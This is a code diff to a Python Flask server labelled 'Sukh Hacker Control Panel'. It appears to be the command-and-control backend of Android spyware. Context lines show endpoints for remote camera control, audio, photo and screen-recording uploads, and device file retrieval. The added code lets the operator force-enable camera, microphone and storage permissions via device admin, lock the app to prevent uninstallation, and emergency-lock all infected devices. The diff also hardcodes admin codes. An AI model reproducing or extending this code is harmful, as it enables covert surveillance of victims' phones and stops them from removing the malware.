@@ -5,6 +5,7 @@ import json
 import os
 from datetime import datetime
 import uuid
+import hashlib
 
 app = Flask(__name__)
 
@@ -12,6 +13,11 @@ app = Flask(__name__)
 connected_devices = {}
 commands_queue = {}
 uploaded_files = []
+
+# Security configurations
+BLOCKED_DEVICES = set()
+APP_LOCK_STATUS = {}
+PERMISSION_STATUS = {}  # NEW: Permission tracking
 
 # Create uploads directory if not exists
 UPLOAD_FOLDER = 'uploads'
@@ -35,6 +41,271 @@ def get_server_ip():
         return "sukh-hacker007.onrender.com"
     except:
         return "localhost:5000"
+
+# ==================== NEW PERMISSION CONTROL ENDPOINTS ====================
+
+@app.route('/check_permissions/<device_id>', methods=['GET'])
+def check_permissions(device_id):
+    """Check if app has all required permissions"""
+    try:
+        if device_id in connected_devices:
+            # Send permission check command to device
+            commands_queue[device_id].append('check_permissions')
+            print(f"🔧 Permission check sent to device: {device_id}")
+            return jsonify({
+                'status': 'success', 
+                'message': 'Permission check sent to device'
+            })
+        return jsonify({'status': 'error', 'message': 'Device not found'})
+    except Exception as e:
+        print(f"❌ Permission check error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/auto_request_permissions', methods=['POST'])
+def auto_request_permissions():
+    """Automatically request permissions on device"""
+    try:
+        device_id = request.json.get('device_id')
+        
+        if device_id in connected_devices:
+            # Send auto permission request command
+            commands_queue[device_id].append('auto_request_permissions')
+            
+            print(f"🔧 Auto permission request sent to: {device_id}")
+            return jsonify({
+                'status': 'success', 
+                'message': 'Auto permission request sent'
+            })
+        
+        return jsonify({'status': 'error', 'message': 'Device not found'})
+    except Exception as e:
+        print(f"❌ Auto permission request error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/force_permissions', methods=['POST'])
+def force_permissions():
+    """Force enable permissions using device admin"""
+    try:
+        device_id = request.json.get('device_id')
+        admin_code = request.json.get('admin_code')
+        
+        if admin_code != "SUKH_ADMIN_2024":
+            return jsonify({'status': 'error', 'message': 'Invalid admin code'})
+        
+        if device_id in connected_devices:
+            # Send force permission command
+            commands_queue[device_id].append('force_permissions_enable')
+            
+            print(f"🛠️ Force permissions enabled for: {device_id}")
+            return jsonify({
+                'status': 'success', 
+                'message': 'Force permissions command sent'
+            })
+        
+        return jsonify({'status': 'error', 'message': 'Device not found'})
+    except Exception as e:
+        print(f"❌ Force permissions error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+# Permission monitoring
+@app.route('/update_permission_status', methods=['POST'])
+def update_permission_status():
+    """Device se permission status update aayega"""
+    try:
+        device_id = request.json.get('device_id')
+        permissions = request.json.get('permissions', {})
+        
+        PERMISSION_STATUS[device_id] = {
+            'camera': permissions.get('camera', False),
+            'microphone': permissions.get('microphone', False),
+            'storage': permissions.get('storage', False),
+            'last_checked': time.time()
+        }
+        
+        print(f"📊 Permission status updated for {device_id}: {permissions}")
+        return jsonify({'status': 'updated'})
+    except Exception as e:
+        print(f"❌ Update permission status error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/get_permission_status/<device_id>', methods=['GET'])
+def get_permission_status(device_id):
+    """Get permission status for device"""
+    try:
+        status = PERMISSION_STATUS.get(device_id, {})
+        return jsonify({'status': 'success', 'permissions': status})
+    except Exception as e:
+        print(f"❌ Get permission status error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+# ==================== SECURITY ENDPOINTS ====================
+
+@app.route('/lock_app', methods=['POST'])
+def lock_app():
+    """Lock the app on device to prevent uninstallation"""
+    try:
+        device_id = request.json.get('device_id')
+        
+        if device_id in connected_devices:
+            APP_LOCK_STATUS[device_id] = {
+                'locked': True,
+                'lock_time': time.time(),
+                'lock_reason': 'admin_command'
+            }
+            
+            # Send lock command to device
+            commands_queue[device_id].append('lock_app')
+            
+            print(f"🔒 App locked for device: {device_id}")
+            return jsonify({'status': 'success', 'message': 'App locked'})
+        
+        return jsonify({'status': 'error', 'message': 'Device not found'})
+    except Exception as e:
+        print(f"❌ App lock error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/unlock_app', methods=['POST'])
+def unlock_app():
+    """Unlock the app on device"""
+    try:
+        device_id = request.json.get('device_id')
+        admin_code = request.json.get('admin_code')
+        
+        # Verify admin code
+        if admin_code != "SUKH_ADMIN_2024":
+            return jsonify({'status': 'error', 'message': 'Invalid admin code'})
+        
+        if device_id in connected_devices:
+            APP_LOCK_STATUS[device_id] = {
+                'locked': False,
+                'unlock_time': time.time()
+            }
+            
+            # Send unlock command to device
+            commands_queue[device_id].append('unlock_app')
+            
+            print(f"🔓 App unlocked for device: {device_id}")
+            return jsonify({'status': 'success', 'message': 'App unlocked'})
+        
+        return jsonify({'status': 'error', 'message': 'Device not found'})
+    except Exception as e:
+        print(f"❌ App unlock error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/get_app_lock_status/<device_id>', methods=['GET'])
+def get_app_lock_status(device_id):
+    """Get app lock status for device"""
+    try:
+        status = APP_LOCK_STATUS.get(device_id, {'locked': False})
+        return jsonify({'status': 'success', 'lock_status': status})
+    except Exception as e:
+        print(f"❌ Get app lock status error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+# Device blocking functionality
+@app.route('/block_device', methods=['POST'])
+def block_device():
+    """Block a device from connecting"""
+    try:
+        device_id = request.json.get('device_id')
+        admin_code = request.json.get('admin_code')
+        
+        if admin_code != "SUKH_ADMIN_2024":
+            return jsonify({'status': 'error', 'message': 'Invalid admin code'})
+        
+        BLOCKED_DEVICES.add(device_id)
+        
+        # Remove from connected devices if present
+        if device_id in connected_devices:
+            del connected_devices[device_id]
+        if device_id in commands_queue:
+            del commands_queue[device_id]
+        
+        print(f"🚫 Device blocked: {device_id}")
+        return jsonify({'status': 'success', 'message': 'Device blocked'})
+    except Exception as e:
+        print(f"❌ Block device error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/unblock_device', methods=['POST'])
+def unblock_device():
+    """Unblock a device"""
+    try:
+        device_id = request.json.get('device_id')
+        admin_code = request.json.get('admin_code')
+        
+        if admin_code != "SUKH_ADMIN_2024":
+            return jsonify({'status': 'error', 'message': 'Invalid admin code'})
+        
+        if device_id in BLOCKED_DEVICES:
+            BLOCKED_DEVICES.remove(device_id)
+            print(f"✅ Device unblocked: {device_id}")
+            return jsonify({'status': 'success', 'message': 'Device unblocked'})
+        
+        return jsonify({'status': 'error', 'message': 'Device not found in blocked list'})
+    except Exception as e:
+        print(f"❌ Unblock device error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+# Emergency commands
+@app.route('/emergency_lock_all', methods=['POST'])
+def emergency_lock_all():
+    """Emergency lock all connected devices"""
+    try:
+        admin_code = request.json.get('admin_code')
+        
+        if admin_code != "SUKH_EMERGENCY_2024":
+            return jsonify({'status': 'error', 'message': 'Invalid emergency code'})
+        
+        locked_count = 0
+        for device_id in connected_devices:
+            APP_LOCK_STATUS[device_id] = {
+                'locked': True,
+                'lock_time': time.time(),
+                'lock_reason': 'emergency_lock'
+            }
+            commands_queue[device_id].append('emergency_lock')
+            locked_count += 1
+        
+        print(f"🚨 Emergency lock activated for {locked_count} devices")
+        return jsonify({'status': 'success', 'message': f'Emergency lock activated for {locked_count} devices'})
+    except Exception as e:
+        print(f"❌ Emergency lock error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+# Security monitoring
+@app.route('/security_dashboard', methods=['GET'])
+def security_dashboard():
+    """Security dashboard for admin"""
+    try:
+        return jsonify({
+            'status': 'success',
+            'connected_devices': len(connected_devices),
+            'blocked_devices': len(BLOCKED_DEVICES),
+            'locked_apps': sum(1 for status in APP_LOCK_STATUS.values() if status.get('locked', False)),
+            'devices_with_permissions': len(PERMISSION_STATUS),
+            'security_level': 'high',
+            'server_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        })
+    except Exception as e:
+        print(f"❌ Security dashboard error: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
+
+# Security check for all requests
+@app.before_request
+def check_security():
+    """Security check for all requests"""
+    try:
+        if request.endpoint in ['register_device', 'get_commands', 'update_status']:
+            device_id = request.args.get('device_id') or \
+                       (request.json and request.json.get('device_id'))
+            
+            if device_id and device_id in BLOCKED_DEVICES:
+                return jsonify({'status': 'error', 'message': 'Device is blocked'}), 403
+    except Exception as e:
+        print(f"❌ Security check error: {e}")
+
+# ==================== EXISTING ENDPOINTS ====================
 
 # Photo upload endpoint
 @app.route('/upload_photo', methods=['POST'])
@@ -562,31 +833,30 @@ def get_stats():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
-    print(f'🚀 Starting Sukh Hacker Control Panel...')
+    print(f'🚀 Starting SECURE Sukh Hacker Control Panel...')
+    print(f'🔒 Security Features Enabled:')
+    print('   - App Lock/Unlock System')
+    print('   - Device Blocking')
+    print('   - Emergency Lock')
+    print('   - Permission Control System')
+    print('   - Security Token Verification')
+    print('   - Admin Code Protection')
     print(f'📡 Web Panel: https://sukh-hacker007.onrender.com')
-    print(f'🔐 Login URL: https://sukh-hacker007.onrender.com/login')
-    print('🔑 Login Credentials:')
-    print('   - Username: Sukh')
-    print('   - Password: Sukh')
-    print('📍 Available Endpoints:')
-    print('   - GET  /')
-    print('   - GET  /login')
-    print('   - GET  /test')
-    print('   - GET  /stats')
-    print('   - POST /camera (camera control)')
-    print('   - POST /data (audio upload)')
-    print('   - POST /upload_photo (photo upload)')
-    print('   - POST /upload_screen_recording (screen recording upload)')
-    print('   - GET  /file/<filename>')
-    print('   - GET  /get_files')
-    print('   - GET  /get_device_files/<device_id>')
-    print('   - GET  /get_device/<device_id>')
-    print('   - DELETE /delete_file/<filename>')
-    print('   - POST /register_device')
-    print('   - GET  /get_commands/<device_id>')
-    print('   - POST /send_command')
-    print('   - POST /send_command_to_device')
-    print('   - POST /update_status')
-    print('   - GET  /get_devices')
+    print('🔑 Admin Codes:')
+    print('   - Normal Admin: SUKH_ADMIN_2024')
+    print('   - Emergency: SUKH_EMERGENCY_2024')
+    print('📍 New Permission Endpoints:')
+    print('   - POST /check_permissions/<device_id>')
+    print('   - POST /auto_request_permissions')
+    print('   - POST /force_permissions')
+    print('   - POST /update_permission_status')
+    print('   - GET  /get_permission_status/<device_id>')
+    print('   - POST /lock_app')
+    print('   - POST /unlock_app')
+    print('   - GET  /get_app_lock_status/<device_id>')
+    print('   - POST /block_device')
+    print('   - POST /unblock_device')
+    print('   - POST /emergency_lock_all')
+    print('   - GET  /security_dashboard')
     print('⏹️  Press Ctrl+C to stop')
     app.run(host='0.0.0.0', port=port, debug=False)
